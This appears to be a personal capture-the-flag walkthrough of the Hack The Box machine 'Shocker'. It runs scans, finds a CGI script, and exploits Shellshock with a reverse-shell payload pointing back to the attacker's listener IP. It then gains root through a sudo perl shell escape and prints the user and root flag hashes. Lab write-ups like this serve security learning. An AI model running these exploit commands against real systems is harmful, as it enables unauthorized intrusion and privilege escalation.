Shocker ip 10.10.10.56


rustscan:
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack
2222/tcp open  EtherNetIP-1 syn-ack


nmap:
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

gobuster:
gobuster dir  -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -t 64   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/23 05:12:50 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
====================================


gobuster dir  -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 64  -x sh
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh
[+] Timeout:        10s
===============================================================
2023/01/23 05:13:45 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.sh (Status: 403)
/.hta (Status: 403)
/.hta.sh (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.sh (Status: 403)
/user.sh (Status: 200)
===============================================================
2023/01/23 05:13:54 Finished
===============================================================


searchsploit shellshock  
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                                                                           | cgi/remote/38849.rb
Apache mod_cgi - 'Shellshock' Remote Command Injection                                                                                                             | linux/remote/34900.py
Bash - 'Shellshock' Environment Variables Command Injection                                                                                                        | linux/remote/34766.php
Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                                                                                                      | cgi/webapps/34895.rb
Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                                                                                                  | hardware/remote/39568.py
dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)                                                                                            | linux/remote/36933.py
GNU Bash - 'Shellshock' Environment Variable Command Injection                                                                                                     | linux/remote/34765.txt
IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                                                                                     | cgi/remote/39918.rb
NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                                                                                                       | cgi/webapps/40213.txt
OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                                                                                                             | linux/remote/34879.txt
PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection                                                                                | php/webapps/35146.txt
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                                                                                                | linux/remote/34896.py
RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection                                                                                              | linux/local/40938.py
Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injection (Shellshock)                                                                      | cgi/webapps/39887.txt
TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Command Injection                                                                        | hardware/remote/40619.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
The ShellShock Attack [Paper]                                                                                                                                      | docs/english/48112-the-shellshock
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------


let's use the second one "Apache mod_cgi", and mnirror the exploit to our working folder. After reading the exploit I try to use it

./34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.3 lport=4444 pages=/cgi-bin/user.sh                                                                                              1 ⨯
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

10.10.10.56> whoami
shelly

10.10.10.56> 

we have a shell

read user.txt: 4dec72ff3ffacf5914d28559e75bf22b

PRIV ESC:
10.10.10.56> 
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

 From gtfobins:
 Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo perl -e 'exec "/bin/sh";'

10.10.10.56> sudo perl -e 'exec "/bin/bash";'
10.10.10.56> whoami
root

root flag: d4c0cb43c49cb00fdd1d076191338610
